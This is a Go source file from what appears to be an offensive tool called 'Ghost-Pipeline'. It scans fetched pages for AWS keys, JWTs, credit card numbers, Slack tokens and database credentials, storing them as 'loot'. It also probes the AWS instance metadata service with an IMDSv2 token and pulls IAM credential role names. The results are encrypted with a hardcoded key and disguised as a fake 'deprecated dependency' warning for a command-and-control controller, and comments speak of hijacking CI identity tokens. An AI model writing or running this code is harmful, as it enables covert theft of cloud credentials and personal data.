package logic

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"sync"
	"time"

	"github.com/pterm/pterm"
)

type Finding struct {
	Type   string
	Value  string
	Source string
}

var (
	Vault    []Finding
	vaultMux sync.Mutex

	// MasterKey: Synchronized with Ghost-Pipeline v4.2.6 Master Decrypt Key
	MasterKey = []byte("G-KaPdSgVkYp3s6v9y$B&E)H@McQfTjW")

	// Automated PII & Secret Patterns
	Patterns = map[string]*regexp.Regexp{
		"AWS_KEY":       regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
		"JWT_TOKEN":     regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
		"CREDIT_CARD":   regexp.MustCompile(`(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12})`),
		"EMAIL":         regexp.MustCompile(`[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`),
		"SLACK_TOKEN":   regexp.MustCompile(`xox[baprs]-[0-9a-zA-Z]{10,48}`),
		"DB_CONNECTION": regexp.MustCompile(`(postgres|mysql|mongodb):\/\/[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-z0-9.-]+:\d+\/\w+`),
		"STACK_TRACE":   regexp.MustCompile(`(?i)(stacktrace|exception|at\s+[\w\.]+\([\w\.]+\.java:\d+\)|File\s+".+\.py",\s+line\s+\d+)`),
		//"METADATA_IP":   regexp.MustCompile(`169\.254\.169\.254`),
		"METADATA_IP":   regexp.MustCompile(`127\.0\.0\.1`),
	}
)

// GhostMask encrypts findings and masks them as benign warnings for the C2 controller
func GhostMask(data string) {
	block, err := aes.NewCipher(MasterKey)
	if err != nil {
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	encoded := base64.StdEncoding.EncodeToString(ciphertext)

	// Stealth Trigger: Camouflage for Ghost-Pipeline Python Controller
	pterm.Warning.Printfln("Deprecated dependency 'net/v1.0.4' detected: %s", encoded)
}

// ProbeCloudMetadata (Phase 8.3) executes an automated OOB/Cloud pivot
func ProbeCloudMetadata(targetIP string, sourceURL string) {
	client := &http.Client{Timeout: 5 * time.Second}

	// 1. OIDC Environment Sensing (GitHub Actions / CI/CD)
	if os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL") != "" {
		pterm.Info.Println("Phase 8.3: OIDC Context detected. Hijacking identity...")
		// Placeholder for OIDC exfiltration logic
	}

	// 2. AWS IMDSv2 Handshake (Token Acquisition)
	tokenReq, _ := http.NewRequest("PUT", "http://"+targetIP+"/latest/api/token", nil)
	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	
	resp, err := client.Do(tokenReq)
	if err != nil {
		return 
	}
	defer resp.Body.Close()
	token, _ := io.ReadAll(resp.Body)

	// 3. Credential Harvesting & Stealth Exfiltration
	credURL := fmt.Sprintf("http://%s/latest/meta-data/iam/security-credentials/", targetIP)
	req, _ := http.NewRequest("GET", credURL, nil)
	req.Header.Set("X-aws-ec2-metadata-token", string(token))

	if resp, err = client.Do(req); err == nil {
		defer resp.Body.Close()
		roles, _ := io.ReadAll(resp.Body)
		GhostMask(fmt.Sprintf("IMDS_EXPLOIT | SRC:%s | ROLES:%s", sourceURL, string(roles)))
	}
}

func ScanForLoot(body string, url string) {
    vaultMux.Lock()
    defer vaultMux.Unlock()

    for label, re := range Patterns {
        matches := re.FindAllString(body, -1)
        for _, m := range matches {
            // Check for duplicates
            exists := false
            for _, v := range Vault {
                if v.Value == m {
                    exists = true
                    break
                }
            }

            if !exists {
                // ADD TO VAULT
                Vault = append(Vault, Finding{Type: label, Value: m, Source: url})
                
                pterm.DefaultBasicText.WithStyle(pterm.NewStyle(pterm.FgBlack, pterm.BgLightYellow)).
                    Printfln(" LOOT DISCOVERED [%s] at %s ", label, url)

                // Trigger Phase 8.3 Cloud Pivot
                if label == "METADATA_IP" {
                    go ProbeCloudMetadata(m, url)
                }
            }
        }
    }
}